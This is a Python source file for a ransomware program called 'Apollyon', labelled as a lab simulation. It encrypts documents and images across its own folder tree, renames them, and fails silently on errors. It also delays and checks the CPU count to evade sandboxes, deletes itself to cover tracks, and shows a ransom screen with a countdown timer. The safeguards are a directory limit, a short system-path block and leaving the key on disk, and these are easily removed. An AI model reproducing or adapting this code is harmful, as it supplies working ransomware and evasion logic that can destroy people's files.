import os
import sys
import time
import base64
from cryptography.fernet import Fernet
from tkinter import *
from threading import Thread

# =========================================================================
# 1. CORE CONFIGURATION & SAFETY GATES
# =========================================================================

# --- [SAFETY GATE 1: TARGET DEFINITION] ---
TARGET_DIR = os.path.dirname(os.path.abspath(__file__)) 
EXCLUSION_LIST = ['Apollyon_Client.py', 'Apollyon_Tool.py', 'encryption_key.log', 'lab_files_list.log']
FILE_EXTENSIONS = ('.txt', '.doc', '.docx', '.jpg', '.png', '.pdf', '.xlsx') # Target file types

# --- [SAFETY GATE 2: SYSTEM PATH PREVENTION] ---
def check_for_system_paths(path):
    system_paths = ["C:\\Windows", "/etc", "/dev", "C:\\Users\\"]
    if any(p.lower() in path.lower() for p in system_paths):
        print("FATAL ERROR: Attempted simulation on a high-risk system path. Exiting.")
        sys.exit(1)
check_for_system_paths(TARGET_DIR)

# =========================================================================
# 2. RANSOMWARE MECHANISMS
# =========================================================================

class ApollyonEngine:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.encrypted_files_count = 0
        
        self.log_file = os.path.join(TARGET_DIR, "encryption_key.log")
        self.path_log = os.path.join(TARGET_DIR, "lab_files_list.log")

    def log_artifact(self, filepath):
        # Logs the encrypted path to the path log file
        with open(self.path_log, 'a') as f:
            f.write(f"{filepath}\n")
        
    def write_key(self):
        # Writes the key artifact to disk (simulates C2 exfiltration)
        with open(self.log_file, 'wb') as key_file:
            key_file.write(self.key)
        
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                original = file.read()
            
            encrypted_data = self.fernet.encrypt(original)
            
            with open(file_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
                
            # Rename the file to append .apollyon extension
            new_path = file_path + ".apollyon"
            os.rename(file_path, new_path)
            self.log_artifact(new_path)
            self.encrypted_files_count += 1
            
        except Exception:
            # Silent failure is typical of malware
            pass

    def anti_analysis_check(self):
        print("Initializing payload... running anti-analysis check.")
        time.sleep(7) # Extended delay to defeat simple automated sandboxes

        # Basic Sandbox/Debugger Check
        if os.environ.get('NUMBER_OF_PROCESSORS') and int(os.environ['NUMBER_OF_PROCESSORS']) < 2:
             print("SIMULATION ABORTED: Low CPU environment detected. Assuming VM/Sandbox.")
             sys.exit(0)
            
    def self_delete(self):
        # Self-deletion mechanism
        try:
            # Move the file to be deleted on next reboot (more persistent)
            current_script = os.path.abspath(__file__)
            # Alternatively: os.remove(current_script) for immediate deletion
            print(f"Payload complete. Deleting {current_script} to cover tracks...")
            time.sleep(1) 
            os.remove(current_script) # Immediate deletion for this simulation to be clean
        except Exception as e:
            print(f"Failed to self-delete: {e}")

    def run_encryption(self):
        self.anti_analysis_check()
        
        # Write key first (simulates C2 key exchange)
        self.write_key()
        
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith(tuple(FILE_EXTENSIONS)) and file not in EXCLUSION_LIST:
                    self.encrypt_file(file_path)
        
        # Start GUI and then delete payload
        Thread(target=self.start_gui).start()
        # Give GUI time to start before deleting the file that launched it 
        time.sleep(2) 
        self.self_delete() 

# =========================================================================
# 3. GUI & RANSOM NOTE
# =========================================================================

    def start_gui(self):
        window = Tk()
        window.title("!!! APOLYON COMPROMISED - LAB DEMO !!!")
        window.geometry("850x450")
        window.resizable(False, False)
        window.configure(bg="#2d0505")

        # ... (GUI creation logic remains similar) ...

        title_label = Label(window, text="APOLLYON v1.0 - ALL FILES ENCRYPTED", bg="#2d0505", fg="#ff4d4d", font=("Courier", 34))
        title_label.pack(pady=15)

        info_text = (
            f"!!! SIMULATION ACTIVE !!!\n\n{self.encrypted_files_count} assets were encrypted using strong AES-128."
            "\n Forensic Artifacts (Encryption Key, Path Log) were left behind for analysis."
            "\n\nObtain the Apollyon_Tool.py and use the 'encryption_key.log' to begin recovery."
            "\n\nTHIS IS FOR AUTHORIZED PENTESTING ONLY. NO REAL PAYMENT IS REQUIRED."
        )
        info_label = Label(window, text=info_text, bg="#2d0505", fg="#e0e0e0", font=("Arial", 13), justify=LEFT)
        info_label.pack(pady=15, padx=30)
        
        # --- Timer Simulation ---
        def update_timer(time_left):
            if time_left >= 0:
                minutes, seconds = divmod(time_left, 60)
                timer_label.config(text=f"DECRYPTION WINDOW CLOSES IN: {minutes:02d}:{seconds:02d}", fg="#ffc107")
                window.after(1000, update_timer, time_left - 1)
            else:
                timer_label.config(text="WINDOW EXPIRED. ARTIFACTS WILL BE CORRUPTED.", fg="#888888")

        timer_label = Label(window, text="Starting Timer...", bg="#2d0505", fg="#ffc107", font=("Courier", 24, "bold"))
        timer_label.pack(pady=20)
        
        # Start the countdown from 10 minutes (600 seconds)
        update_timer(600) 

        window.mainloop()

if __name__ == '__main__':
    engine = ApollyonEngine()
    engine.run_encryption()
